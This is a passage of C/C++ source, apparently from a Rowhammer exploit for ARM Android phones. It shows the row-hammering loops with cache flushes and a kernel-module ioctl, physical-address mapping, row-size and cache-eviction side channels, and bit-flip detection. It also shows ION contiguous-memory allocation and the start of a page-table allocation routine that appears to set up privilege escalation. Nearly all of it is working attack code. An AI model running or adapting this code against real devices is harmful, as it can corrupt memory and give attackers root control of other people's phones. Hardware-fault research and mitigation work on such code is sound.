    int readcount = count;
    volatile uint32_t *p = (uint32_t *) f;

    uint32_t prev_page = (uint32_t) f;
    uint32_t next_page = (uint32_t) f + ROWSIZE + ROWSIZE; 
    uint32_t prev_page_end = prev_page + 1024;
    uint32_t next_page_end = next_page + 1024;

//    printf("\n %p %p %p\n", prev_page, prev_page + ROWSIZE, next_page);


    t1 = get_ns();
    readcount = count;
    while (readcount > 0) {
        for (int i = 0; i < 32; i++) {
            asm volatile ("dsb ish");
            asm volatile ("isb");
            p = (uint32_t *) *p;
            readcount--;
        }
        //clearcache( (uint32_t *) prev_page, (uint32_t *) prev_page_end);
//        clearcache( (uint32_t *) next_page, (uint32_t *) next_page_end);
        ioctl(rh_fd, (uint32_t) prev_page, prev_page_end);
        ioctl(rh_fd, (uint32_t) next_page, next_page_end);
    }   
    t2 = get_ns();


    return (t2 - t1) / count;
#endif



    if (conf == 4)
    {
        struct hammer_addresses_t cpu1, cpu2, cpu3, cpu4;
#ifdef ARM7
        cpu1.f = (uint32_t *) f; cpu3.f = (uint32_t *) f;
        cpu1.s = (uint32_t *) f; cpu3.s = (uint32_t *) f;
        cpu2.f = (uint32_t *) s; cpu4.f = (uint32_t *) s;
        cpu2.s = (uint32_t *) s; cpu4.s = (uint32_t *) s;
#else
        cpu1.f = f; cpu3.f = f;
        cpu1.s = f; cpu3.s = f;
        cpu2.f = s; cpu4.f = s;
        cpu2.s = s; cpu4.s = s;
#endif
        cpu1.read_count = cpu2.read_count = cpu3.read_count = cpu4.read_count = count;
        cpu1.cpu = 0; cpu2.cpu = 1; cpu3.cpu = 2; cpu4.cpu = 3;
        
        pthread_t thread1, thread2, thread3, thread4;
#ifdef ARM7
        pthread_barrier_init(&barrier, NULL, 4);
#endif

        if(pthread_create(&thread1, NULL, hammer_thread, &cpu1)) {
            perror("Could not create pthread 1"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread2, NULL, hammer_thread, &cpu2)) {
            perror("Could not create pthread 2"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread3, NULL, hammer_thread, &cpu3)) {
            perror("Could not create pthread 3"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread4, NULL, hammer_thread, &cpu4)) {
            perror("Could not create pthread 4"); exit(EXIT_FAILURE); }

        if (pthread_join(thread1, NULL)) {
            perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
        if (pthread_join(thread2, NULL)) {
            perror("Could not join pthread 2"); exit(EXIT_FAILURE); }
        if (pthread_join(thread3, NULL)) {
            perror("Could not join pthread 3"); exit(EXIT_FAILURE); }
        if (pthread_join(thread4, NULL)) {
            perror("Could not join pthread 4"); exit(EXIT_FAILURE); }
   
        t1 = cpu1.t1;
        t2 = cpu1.t2;
        if (cpu2.t1 < t1) t1 = cpu2.t1;
        if (cpu3.t1 < t1) t1 = cpu3.t1;
        if (cpu4.t1 < t1) t1 = cpu4.t1;
        if (cpu2.t2 > t2) t2 = cpu2.t2;
        if (cpu3.t2 > t2) t2 = cpu3.t2;
        if (cpu4.t2 > t2) t2 = cpu4.t2;
        return (t2 - t1) / count;
    }
    else if (conf == 2)
    {
        struct hammer_addresses_t cpu1, cpu2;
#ifdef ARM7
        cpu1.f = (uint32_t *) f; cpu1.s = (uint32_t *) f;
        cpu2.f = (uint32_t *) s; cpu2.s = (uint32_t *) s;
#else
        cpu1.f = f; cpu1.s = f;
        cpu2.f = s; cpu2.s = s;
#endif
        cpu1.read_count = cpu2.read_count = count;
        cpu1.cpu = 0;
        cpu2.cpu = 1;

        pthread_t thread_1, thread_2;
#ifdef ARM7
        pthread_barrier_init(&barrier, NULL, 2);
#endif

        if(pthread_create(&thread_1, NULL, hammer_thread, &cpu1)) {
            perror("Could not create pthread 1"); exit(EXIT_FAILURE); }
        if(pthread_create(&thread_2, NULL, hammer_thread, &cpu2)) {
            perror("Could not create pthread 2"); exit(EXIT_FAILURE); }

        if (pthread_join(thread_1, NULL)) {
            perror("Could not join pthread 1"); exit(EXIT_FAILURE); }
        if (pthread_join(thread_2, NULL)) {
            perror("Could not join pthread s"); exit(EXIT_FAILURE); }

        t1 = cpu1.t1 < cpu2.t1 ?  cpu1.t1 : cpu2.t1;
        t2 = cpu1.t2 > cpu2.t2 ?  cpu1.t2 : cpu2.t2;
        return (t2 - t1) / count;
    }
    else if (conf == 1)
    {
        struct hammer_addresses_t cpu;
        cpu.read_count = count;
#ifdef ARM7
        cpu.f = (uint32_t *) f;
        cpu.s = (uint32_t *) s;
  #ifdef USE_LKM
        return ioctl(rh_fd, RH_IOC_HAMMER, &cpu);
  #else
        t1 = get_ns();
        while (cpu.read_count-- >0) {
            *cpu.f;
            *cpu.s;
//          flush((void *)cpu.f);
//          flush((void *)cpu.s);
        }
        t2 = get_ns();
        return (t2 - t1) / count;
  #endif
#else /* ARM8 */
        cpu.f = f;
        cpu.s = s;
  #ifdef USE_LKM
        return ioctl(rh_fd, RH_IOC_HAMMER, &cpu);
  #else
        t1 = get_ns();
        while (cpu.read_count-- >0) {
//          asm volatile ("dsb ish");
            *cpu.f;
            *cpu.s;
//          asm volatile ("dsb ish");
            asm volatile ("dc civac, %0" :: "r"(cpu.f));
            asm volatile ("dc civac, %0" :: "r"(cpu.s));
        }
        t2 = get_ns();
        return (t2 - t1) / count;
  #endif
#endif
    }
}



int contiguous_sidechannel(void) {

//    uint32_t mapping_size = PAGESIZE * 10000;
    uint32_t mapping_size = PAGESIZE * 3;

do {
    printf("---\n");
    ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
    
    void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                                             MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t counter = 0 ;
    if (read(perf_fd, &counter, sizeof(counter)) < sizeof(counter)) {
         perror("Could not read performance counter");
         exit(EXIT_FAILURE);
    }
    if (mapping == MAP_FAILED) {
        perror("Could not mmap");
        exit(EXIT_FAILURE);
    }
    
    
    /* build a reverse mapping of <physical address> to <virtual address> */
    std::map<uint32_t, uint32_t>reverse_mapping;

    for (uint32_t offset = 0; offset < mapping_size; offset += PAGESIZE) {
        uint32_t mva = (uint64_t) mapping + offset;
        uint32_t vis = get_phys_addr(mva);
        reverse_mapping[vis] = mva;
    }



    /* search for the largest contigious region */
    uint32_t start_vis,  start_mva,  count,  best_vis,  best_mva,  best_count,  prev_vis, prev_mva;
             start_vis = start_mva = count = best_vis = best_mva = best_count = prev_vis = prev_mva = 0;
    best_count = 1;


    for (auto & it : reverse_mapping) {
        uint32_t vis = it.first;
        uint32_t mva = it.second;
        count++;
        if (vis != prev_vis + PAGESIZE) {
            /* end of contigious region */
            if (count > 1) {
                best_count = count;
                best_vis = start_vis;
                best_mva = start_mva;

        printf("[!] %2u cont. pages, vis %x - %x = %x ", best_count, prev_vis, best_vis, (prev_vis - best_vis));
        printf("(mva %x - %x = %8x): %" PRIu64 " ins\n", prev_mva, best_mva, (prev_mva - best_mva), counter);
            }
            start_vis = vis;
            start_mva = mva;
            count = 0;
        } 
        prev_vis = vis;
        prev_mva = mva;
    }
       
} while (true);


    return 0;
}

int rowsize_sidechannel(void *mapping, uint64_t mapping_size) {
   
    /* build a reverse mapping of <physical address> to <virtual address> */
    std::map<uint64_t, uint64_t>reverse_mapping;

    for (uint64_t offset = 0; offset < mapping_size; offset += PAGESIZE) {
        uint64_t mva = (uint64_t) mapping + offset;
        uint64_t vis = get_phys_addr(mva);
        reverse_mapping[vis] = mva;
    }

    /* search for the largest contigious region */
    uint64_t start_vis,  start_mva,  count,  best_vis,  best_mva,  best_count,  prev_vis;
             start_vis = start_mva = count = best_vis = best_mva = best_count = prev_vis = 0;

    for (auto & it : reverse_mapping) {
        uint64_t vis = it.first;
        uint64_t mva = it.second;
        count++;
        if (vis != prev_vis + PAGESIZE) {
            /* end of contigious region */
            if (count > best_count) {
                best_count = count;
                best_vis = start_vis;
                best_mva = start_mva;
            }
            start_vis = vis;
            start_mva = mva;
            count = 0;
        } 
        prev_vis = vis;
    }
        
    printf("[!] Got contigious memory of %" PRIu64 " pages, starting from vis %p (mva %p)\n", 
           best_count, (void *) best_vis, (void *) best_mva);
    
    if (best_count < 128) {
        printf("[!] Not enough contigious pages to perform the rowsize sidechannel\n");
        exit(EXIT_FAILURE);
    }



    VOID f_mva;
    VOID f_vis;

    VOID s_vis;
    VOID s_mva;


    for (int page = 0; page < 128; page++) {
        f_vis = best_vis + (page * PAGESIZE);
        f_mva = reverse_mapping[f_vis];
        assert(f_mva != 0);

//      printf("%3d. ",page); fflush(stdout);
        for (int i = 0; i < 128; i++) {
            s_vis = best_vis + (i* PAGESIZE);
            s_mva = reverse_mapping[s_vis];
            assert(s_mva != 0);
//          printf("x+%d/x+%3d... ", i, page );
            size_t delta = do_hammer((VOID *) f_mva,
                                     (VOID *) s_mva, 
                                     SIDECH_READCOUNT, DEFAULT_CONF, 1);


            printf("%3zu ", delta);
//          printf("%3zu | ", delta); fflush(stdout);
        }
        printf("\n");
    }

    printf("done\n");

    return 0;
}






int dump_flips(uint8_t *mva, uint8_t *expected, const char *type, uint64_t vis, uint64_t row_index,  
        std::map<uint64_t, std::vector<uint8_t>> &flip_locations)
{
    int flips = 0;
    fprintf(stderr,"\n");
    for (int i = 0; i < 0x1000; i++)
    {
        if (mva[i] != expected[i]) {
            flip_locations[vis + i].push_back(mva[i]);
            flips++;
            fprintf(stderr,"[!] Found %s flip (0x%02x != 0x%02x) in row %" PRIu64 " in physical address %p (= %p + %4d) (#flips at different physical addresses: %zu)\n",
                    type,
                    expected[i],
                    mva[i],
                    row_index,
                    (void *) (vis + i),
                    (void *) vis,
                    i,
                    flip_locations.size());

        }
    }
    fprintf(stderr,"Continuing w/: %" PRIu64 "/%" PRIu64 ": ", row_index-1, row_index+1);
    return flips;
} 




int find_bitflips(void *mapping, uint64_t mapping_size, 
        std::map<uint64_t, std::vector<uint8_t>> &flip0_locations,
        std::map<uint64_t, std::vector<uint8_t>> &flip1_locations,
        std::map<uint64_t, uint64_t> &deltaflips,
        std::map<uint64_t, uint64_t> &counterflips,
        uint64_t first_row = 0, 
        uint64_t  last_row = 0,
        uint64_t option = 0,
        int conf = DEFAULT_CONF,
        uint64_t readcount = DEFAULT_COUNT) {

    std::map<uint64_t, uint64_t>reverse_mapping;

    for (uint64_t offset = 0; offset < mapping_size; offset += PAGESIZE) {
        uint64_t mva = (uint64_t) mapping + offset;
        uint64_t vis = get_phys_addr(mva);
        reverse_mapping[vis] = mva;
    }
    
    typedef std::map<uint64_t, uint64_t>::iterator it_type;

    uint8_t  ones[0x1000];
    uint8_t zeros[0x1000];

    memset( ones, 0xff, 0x1000);
    memset(zeros, 0x00, 0x1000);

    uint64_t prev_row_index = 0;
    int ret;
    int flips0 = 0;
    int flips1 = 0;
    std::vector<uint32_t> deltas;
    std::vector<uint64_t> counters;
    uint64_t starttime, stoptime;

    std::vector<uint64_t> vis_hammered;
    std::vector<uint64_t> vis_to_hammer;


    prev_row_index = 0;
    for (it_type it = reverse_mapping.begin();
            it != reverse_mapping.end();
            it++) {
        VOID vis = it->first;
        VOID mva = it->second;
        if (mva & 0xFFF) { continue; }
        if (vis & 0xFFF) { continue; }
        if (mva == 0x0) { continue; }
        VOID page_above = reverse_mapping[vis - ROWSIZE];
        VOID page_below = reverse_mapping[vis + ROWSIZE];
        if (page_above == 0 || page_below == 0) continue;
        vis_to_hammer.push_back(vis);
    }
    
    starttime = get_us();
    for (it_type it = reverse_mapping.begin();
                 it != reverse_mapping.end();
                 it++) {
        VOID vis = it->first;
        VOID mva = it->second;

        if (mva & 0xFFF) {
            /* mva should point to the start of a page */
            continue;
        }
        if (vis & 0xFFF) {
            /* vis should point to the start of a page */
            continue;
        }
        if (mva == 0x0) {
            /* mva should not be nil */
            continue;
        }

        VOID page_above = reverse_mapping[vis - ROWSIZE];
        VOID page_below = reverse_mapping[vis + ROWSIZE];
        if (page_above == 0 || page_below == 0) continue;
        
        uint32_t row_index = vis / ROWSIZE;

        if (first_row != 0) if (row_index < first_row) continue;
        if ( last_row != 0) if (row_index >  last_row) break;

        if (prev_row_index == 0) 
        {
            prev_row_index = row_index;
            fprintf(stderr,"Hammering rows %" PRIu32 "/%" PRIu32 ": ", row_index-1, row_index+1);
        }
        if (row_index != prev_row_index)
        {
            prev_row_index = row_index;
            stoptime = get_us();
            double delta = ((double)stoptime - (double)starttime) / (double) 1000000.0;
            float vispersecond = (float) vis_hammered.size() / delta;
            int visremaining = vis_to_hammer.size() - vis_hammered.size();
            float estimatedseconds = (float) visremaining / vispersecond;
#if 0
            fprintf(stderr, "- %d/%d in %4.2fs (%4.2f/s). ETA: %5.2fs\n",  
                    vis_hammered.size(),
                    vis_to_hammer.size(), 
                    delta, 
                    vispersecond,
                    estimatedseconds);
#else
            fprintf(stderr,"\n");
#endif
            fprintf(stderr,"Hammering rows %" PRIu32 "/%" PRIu32 ": ", row_index-1, row_index+1);
        }
        fflush(stdout);
        fflush(stderr);


        /* initialize pages */
        VOID *p1 = (VOID *) page_above;
        VOID *p3 = (VOID *) page_below;
    
        /* can we figure out the cacheline size? assuming 64 bytes for now */
        uint32_t index1;
        uint32_t index2;
        index1 = 0;
        index2 = 0;
        std::vector<uint32_t> index1_list, index2_list;
        index1_list.clear();
        index2_list.clear();
        index2_list.push_back(0);
//      printf("range p1: %p - %p\n", (void *) page_above, (void *) page_above + 0x1000);
//      printf("range p3: %p - %p\n", (void *) page_below, (void *) page_below + 0x1000);
#define CHASE_POOL 16
        for (int i = 1; i < CHASE_POOL; i++) {
            
            do {
                index2 = (rand() % CHASE_POOL) * 16;
            } while ( std::find(index2_list.begin(), index2_list.end(), index2) != index2_list.end() ) ;
            index2_list.push_back(index2);
//          index2 = i*CHASE_POOL;
            
            p1[index1] = (VOID) &p3[index1]; p3[index1] = (VOID) &p1[index2];
            
            index1 = index2;
        }
        p1[index1] = (VOID) &p3[index1]; p3[index1] = (VOID) &p1[0];

        uint32_t index0, index3, index4, index5, index6, index7, index8, index9;

#define CACHE_LINE_SIZE 64

        /* Cache line size is 64 bytes which means that a page can be cached in
         * 64 cache lines (4096 / 64).
         */
#if 0
        index0 = 0;
        index1 = 16;
        index2 = 32;
        index3 = 48;
        index4 = 64;
        index5 = 80;
        index6 = 96;
        index7 = 112;
        index8 = 128;
        index9 = 144;
        p1[index0] = (uint32_t) &p3[index1]; p3[index1] = (uint32_t) &p1[index2];
        p1[index2] = (uint32_t) &p3[index3]; p3[index3] = (uint32_t) &p1[index4];
        p1[index4] = (uint32_t) &p3[index5]; p3[index5] = (uint32_t) &p1[index6];
        p1[index6] = (uint32_t) &p3[index7]; p3[index7] = (uint32_t) &p1[index8];
        p1[index8] = (uint32_t) &p3[index9]; p3[index9] = (uint32_t) &p1[index0];
#endif
#if 0
        p1[index5] = (uint32_t) &p3[index5]; p3[index5] = (uint32_t) &p1[index6];
        p1[index6] = (uint32_t) &p3[index6]; p3[index6] = (uint32_t) &p1[index7];
        p1[index7] = (uint32_t) &p3[index7]; p3[index7] = (uint32_t) &p1[index8];
        p1[index8] = (uint32_t) &p3[index8]; p3[index8] = (uint32_t) &p1[index0];
        p1[index9] = (uint32_t) &p3[     0]; p3[     0] = (uint32_t) &p1[     0];
#endif
/*
        p1[144] = (uint32_t) &p3[ 116]; p3[ 116] = (uint32_t) &p1[160];
        p1[160] = (uint32_t) &p3[ 250]; p3[ 250] = (uint32_t) &p1[ 48];
        p1[ 48] = (uint32_t) &p3[ 308]; p3[ 308] = (uint32_t) &p1[176];
        p1[176] = (uint32_t) &p3[ 412]; p3[ 412] = (uint32_t) &p1[  0];
*/
        /*
        printf("\n");
        printf("page_above: %p - %p\n", page_above, page_above + 4096);
        printf("mva:        %p\n", mva);
        printf("page_below: %p - %p\n", page_below, page_below + 4096);

        uint32_t *p = p1;
        for (int i = 0; i < 128; i++) {
            printf("%p ", p);
            if ((uint32_t) p >= page_above && (uint32_t) p <= page_above + 4096) printf("row -1\n");
            if ((uint32_t) p >= page_below && (uint32_t) p <= page_below + 4096) printf("row +1\n");
            p = (uint32_t *) *p;
        }
        printf("done\n");
*/

/*
        int xxx = 64;
        uint32_t *p = p1;
        printf("\npage_above: %p\n",vis - ROWSIZE);
        printf("page_below: %p\n", vis + ROWSIZE);
        printf("p1: %p\n",p1);
        while (xxx-- > 0) {
            printf("p: %p (%p + %5x) (cacheline: %u) \n", p, p1, (p - p1), (p - p1) / 64);
            p = (uint32_t *) *p;
        }
        printf("done\n");
        exit(0);
*/
/*
        std::vector<uint32_t> seen;

        uint32_t *p;
        int xxx = M2;
        printf("\nHere we go...\n");
            p = p1;
        while (xxx-- > 0) {
            seen.push_back( (uint32_t) p);
            p = (uint32_t *) *p;

            if ( std::find(seen.begin(), seen.end(), (uint32_t) p) != seen.end() ) {
                printf("xxx %d\n",xxx);
                seen.clear();
            }
            xxx--;
            
        }
        printf("done\n");

        exit(0);
  */      


        size_t delta0 = 0;
        size_t delta1 = 0;
        uint64_t counter0 = 0;
        uint64_t counter1 = 0;

#if 1 
        /* write all 0s */
        memset((void *)mva, 0x00, 0x1000);

#ifdef PERF
        ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
#endif
    
        /* hammer */
        delta0 = do_hammer((VOID *) page_above, 
                           (VOID *) page_below, 
                           readcount, conf, option);

#ifdef PERF 
        ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
        if (read(perf_fd, &counter0, sizeof(counter0)) != sizeof(counter0)) {
             perror("Could not read performance counter");
             exit(EXIT_FAILURE);
        }
        counters.push_back(counter0);
#endif

        deltas.push_back(delta0);

       
        /* search for flips from 0 to 1 */
        ret = memcmp((void *)mva, zeros, 0x1000);    
        if (ret != 0) {
            int flips = dump_flips((uint8_t *)mva, zeros, "0 to 1", vis, row_index, flip0_locations);
            flips0 += flips;

            if (deltaflips.count(delta0)) deltaflips[delta0] += flips;
            else                          deltaflips[delta0] = flips;

#ifdef PERF
            if (counterflips.count(counter0)) counterflips[counter0] += flips;
            else                              counterflips[counter0] = flips;
#endif
        }
#endif


        /* write all 1s */
        memset((void *)mva, 0xFF, 0x1000);

        /* hammer */
#ifdef PERF
        ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
#endif
    
        delta1 = do_hammer((VOID *) page_above, 
                           (VOID *) page_below, 
                           readcount, conf, option);
     
#ifdef PERF
        ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
        if (read(perf_fd, &counter1, sizeof(counter1)) != sizeof(counter1)) {
             perror("Could not read performance counter");
             exit(EXIT_FAILURE);
        }
        counters.push_back(counter1);
#endif

        deltas.push_back(delta1);

        /* search for flips from 1 to 0 */
        ret = memcmp((void *)mva, ones, 0x1000);    
        if (ret != 0) {
            int flips = dump_flips((uint8_t *)mva, ones, "1 to 0", vis, row_index, flip1_locations);
            flips1 += flips;
            
            if (deltaflips.count(delta1)) deltaflips[delta1] += flips;
            else                          deltaflips[delta1] = flips;
#ifdef PERF
            if (counterflips.count(counter1)) counterflips[counter1] += flips;
            else                              counterflips[counter1] = flips;
#endif
        }

        vis_hammered.push_back(vis);
#ifdef PERF
        char c = 0;
        if (counter0 > 1000000 && counter1 > 1000000) {
            counter0 = counter0 / 1000000;
            counter1 = counter1 / 1000000;
            c = 'M';
        } else if (counter0 > 1000 && counter1 > 1000) {
            counter0 = counter0 / 1000;
            counter1 = counter1 / 1000;
            c = 'K';
        }
        if (c == 0) {
            fprintf(stderr,"%zu/%zu (%" PRIu64 "/%" PRIu64 ") ", delta0, delta1, counter0, counter1);
        } else {
            fprintf(stderr,"%zu/%zu (%" PRIu64 "%c/%" PRIu64 "%c) ", delta0, delta1, counter0, c, counter1, c);
        }
#else
        fprintf(stderr,"%zu/%zu ", delta0, delta1);

#endif
    }


    fprintf(stderr,"\n[!] Done. Found %d 0 to 1 flips and %d 1 to 0 flips (%d flips in total)\n", flips0, flips1, flips0+flips1);

    uint64_t total_ns = std::accumulate(deltas.begin(), deltas.end(), 0.0);
    uint32_t  mean_ns = total_ns / deltas.size();
    fprintf(stderr,"[1] Average time per read: %u ns\n", mean_ns);
#ifdef PERF
    uint64_t total_counters = std::accumulate(counters.begin(), counters.end(), 0.0);
    uint64_t  mean_counters = total_counters / counters.size();
    fprintf(stderr,"[1] Average counter: %" PRIu64 "\n", mean_counters);
#endif

    return (flips0 + flips1);
}





/* function used by the random read thread */
void *seq_access(void *info)
{
    uint8_t *mapping = (uint8_t *) mmap(NULL, RANDOM_BUFFER_SIZE, PROT_READ | PROT_WRITE,
                                                   MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mapping == MAP_FAILED) {
        perror("Could not mmap");
        exit(EXIT_FAILURE);
    }
    memset(mapping, 0x00, RANDOM_BUFFER_SIZE);

#if 0    
    int CACHELINES = 512;
    int skip = 4096;
    while (true) {
        for (uint64_t cacheline = 0; cacheline < CACHELINES; cacheline++) {
            uint64_t mva = (uint64_t) mapping + (cacheline * skip);
            volatile VOID* f = (volatile VOID *) mva;
            *f;
//            asm volatile("dsb ish;");
//            asm volatile("isb;");
        }
    }
#endif


    uint64_t i = 0;
    while(true)
    {
        for(int i = 0; i < RANDOM_BUFFER_SIZE; i++)
        {
            *(mapping + (i % RANDOM_BUFFER_SIZE));
        }
        i += 4096;
        //sleep(1);
    }


    return NULL;
}

uint32_t find_contiguous_chunk(void *mapping, uint64_t mapping_size) {
    
    /* search for the largest contigious region, both physical and virtual */
    uint64_t start_vis,  start_mva,  count,  best_vis,  best_mva,  best_count,  prev_vis,  prev_mva;
             start_vis = start_mva = count = best_vis = best_mva = best_count = prev_vis = prev_mva = 0;

    for (auto & it : reverse_mapping) {
        uint64_t vis = it.first;
        uint64_t mva = it.second;
        count++;
        if (vis != prev_vis + PAGESIZE || mva != prev_mva + PAGESIZE) {
            /* end of contigious region */
            if (count > best_count) {
                best_count = count;
                best_vis = start_vis;
                best_mva = start_mva;
            }
            start_vis = vis;
            start_mva = mva;
            count = 0;
        } 
        prev_vis = vis;
        prev_mva = mva;
    }
        
    printf("[!] Got contigious memory of %" PRIu64 " pages, starting from vis %p (mva %p)\n", 
           best_count, (void *) best_vis, (void *) best_mva);
    return best_vis;
}



#define EVICT_LOOP 1
#define EVICT_COUNT K8

void measure_evict_time(uint32_t vis, int accesses_per_loop_round,      // C
                                      int addresses_per_loop_round,     // D
                                      int step_size,                    // L
                                      int addresses_in_set,             // S
                                      uint32_t *target_read_time,
                                      uint32_t *evict_read_time) {

    uint64_t mva = reverse_mapping[vis];

    uint32_t evict_set[addresses_in_set];
    uint32_t nxt_vis;
    int idx = 1;
    for (int i = 0; i < addresses_in_set; i++) {
        do {
//          nxt_vis = ((vis + L2_CACHELINE_SIZE*L2_SETS*idx));
            nxt_vis = ((vis + L2_CACHELINE_SIZE*L2_SETS*idx) + G1) % G2;
            idx++;
        } while (!reverse_mapping.count(nxt_vis));

        evict_set[i] = reverse_mapping[nxt_vis];
//      printf("- address: %p (+%d)\n", (void*) evict_set[i], L2_SETS*(idx-1) );
    }
    volatile VOID *f = (volatile VOID *) mva;
    volatile VOID **read_set = (volatile VOID **) evict_set;

    uint64_t ns[EVICT_LOOP];
    uint64_t ne[EVICT_LOOP];
    uint64_t perf[EVICT_LOOP];

    for (int i = 0; i < EVICT_LOOP; i++) {
        uint64_t counter = 0;
        uint32_t count = EVICT_COUNT;

        ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);

        uint64_t nss[EVICT_COUNT];
        uint64_t nse[EVICT_COUNT];
                   
        for (int c = 0; c < EVICT_COUNT; c++) {
            uint64_t t1 = get_ns();
            *f;
            uint64_t t2 = get_ns();

#if 1 
            /* this is rowhammerjs evict loop */
            for (int s = 0; s <= addresses_in_set-addresses_per_loop_round; s += step_size) {
                for (int c = 0; c <= accesses_per_loop_round; c += 1) {
                    for (int d = 0; d < addresses_per_loop_round; d+= 1) {
                        *read_set[s+d];
                    }
                }
            }
#else
            /* this is the default evict loop */
            for (int i = 0; i < addresses_in_set; i++) {
                *read_set[i];
//               asm volatile("dsb ish");
            }
#endif
            uint64_t t3 = get_ns();

            nss[c] = (t2 - t1);
            nse[c] = (t3 - t2);
        }

        ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
        if (read(perf_fd, &counter, sizeof(counter)) != sizeof(counter)) {
             perror("Could not read performance counter");
             exit(EXIT_FAILURE);
        }
        ns[i] = median(EVICT_COUNT, nss);
        ne[i] = median(EVICT_COUNT, nse);
        perf[i] = (uint64_t) (counter / (addresses_in_set+1));
    }

    *target_read_time = median(EVICT_LOOP, ns);
     *evict_read_time = median(EVICT_LOOP, ne);
   
    /*
    printf("%10d %5llu / %5llu / %5llu / %5llu %10llu / %5llu / %5llu / %5llu %27llu\n", addresses_in_set, 
                median(EVICT_LOOP,ns), 
                  mean(EVICT_LOOP,ns),
                   min(EVICT_LOOP,ns),
                   max(EVICT_LOOP,ns),
                median(EVICT_LOOP,ne), 
                  mean(EVICT_LOOP,ne),
                   min(EVICT_LOOP,ne),
                   max(EVICT_LOOP,ne),
                median(EVICT_LOOP,perf));
    */
    return;
}



struct ion_handle *ion_alloc(size_t len) {
#ifdef ARM7
#ifdef MSM
    if (len > M4) return NULL;
    struct ion_allocation_data allocation_data;
    allocation_data.heap_mask = (0x1 << 21); // SYSTEM_CONTIG --> kmalloc()
    allocation_data.flags = 0;
    allocation_data.align = 0;
    allocation_data.len = len;
    int err = ioctl(ion_fd, ION_IOC_ALLOC, &allocation_data);
    if (err) return NULL;
    return allocation_data.handle;
#endif // MSM
#endif // ARM7
}

int ion_share(struct ion_handle *handle) {
#ifdef ARM7
    struct ion_fd_data fd_data;
    fd_data.handle = handle;
    int err = ioctl(ion_fd, ION_IOC_SHARE, &fd_data);
    if (err) return -1;
    return fd_data.fd;
#endif
}

int ion_free(struct ion_handle *handle) {
#ifdef ARM7
    struct ion_handle_data handle_data;
    handle_data.handle = handle;
    int err = ioctl(ion_fd, ION_IOC_FREE, &handle_data);
    if (err) return -1;
    return 0;
#endif
}

struct ion_data {
    struct ion_handle *handle;
    int fd;
    void *mapping;
    size_t len;
    bool open;
};

void ion_open(struct ion_data *data) {
#ifdef ARM7
    data->fd = ion_share(data->handle);
    if (data->fd < 0) {
        perror("Could not share ion handle");
        exit(EXIT_FAILURE);
    }

    data->mapping = mmap(0, data->len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, data->fd, 0);
    if (data->mapping == MAP_FAILED) {
        perror("Could not mmap");
        exit(EXIT_FAILURE);
    }
    data->open = true;
#endif
}

void *ion_open_fixed_base = 0;

int ion_alloc_and_map(size_t len, struct ion_data *data, bool open = true, bool map_private = false) {
#ifdef ARM7
//    write(marker_fd,"STARTING MMAP\n", 10);
    data->handle = ion_alloc(len);
    if (data->handle == NULL) {
        /* out of memory, allocated all available contiguous 4M chunks */
        return 1;
    }
    if (open) {
        data->fd = ion_share(data->handle);
        if (data->fd < 0) {
            perror("Could not share ion handle");
            exit(EXIT_FAILURE);
        }
        
        if (map_private) {
            data->mapping = mmap(0, len, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE, data->fd, 0);
        } else {
            if (ion_open_fixed_base) {
                data->mapping = mmap(ion_open_fixed_base, len, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_SHARED | MAP_FIXED, data->fd, 0);
                ion_open_fixed_base += M1;
            } else {
                data->mapping = mmap(0, len, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_SHARED, data->fd, 0);
            }
        }
        if (data->mapping == MAP_FAILED) {
            perror("Could not mmap");
            exit(EXIT_FAILURE);
        }
    }
//    write(marker_fd,"DONE WITH MMAP\n", 10);
    data->len = len;
    data->open = open;
    return 0;
#endif
}

void ion_clean(struct ion_data *data) {
#ifdef ARM7
    if (data->open) {
        if (munmap(data->mapping, data->len)) {
            perror("Could not munmap");
            exit(EXIT_FAILURE);
        }

        if (close(data->fd)) {
            perror("Could not close");
            exit(EXIT_FAILURE);
        }
    }

    if (ion_free(data->handle)) {
        perror("Could not free");
        exit(EXIT_FAILURE);
    }
#endif
}

void ion_open_all(std::vector<struct ion_data> &chunks) {
    for (auto & chunk : chunks) {
        ion_open(&chunk);
    }
}


/* call ion_clean() for all chunks in the vector, except for chunk[victim]. The
 * vector will be cleared no matter what */    
void ion_clean_all(std::vector<struct ion_data> &chunks, int victim = -1) {
    for (int i = 0; i < chunks.size(); i++) {
        if (i != victim) ion_clean(&chunks[i]);
    }
    chunks.clear();
}

#define PT_ALLOC_FILE "/data/local/tmp/ptalloc"
#define PT_ALLOC_VIRT_BASE 0x10000000
int pt_alloc_fd = 0;
int pt_alloc_offset = 0;
void *pt_alloc_mapping;
char pt_alloc_data[M2];

uint32_t pt_alloc() {
    if (pt_alloc_fd == 0) {
        pt_alloc_fd = open(PT_ALLOC_FILE, O_RDONLY);
        if (pt_alloc_fd == -1) {
            pt_alloc_fd = open(PT_ALLOC_FILE, O_RDWR | O_CREAT, S_IRWXU | S_IRGRP | S_IROTH);
            if (pt_alloc_fd == -1) {
                perror("Could not create PT_ALLOC_FILE");
                exit(EXIT_FAILURE);
            }
            if (write(pt_alloc_fd, pt_alloc_data, M2) != M2) {
                perror("Could not write to PT_ALLOC_FILE");
                exit(EXIT_FAILURE);
            }
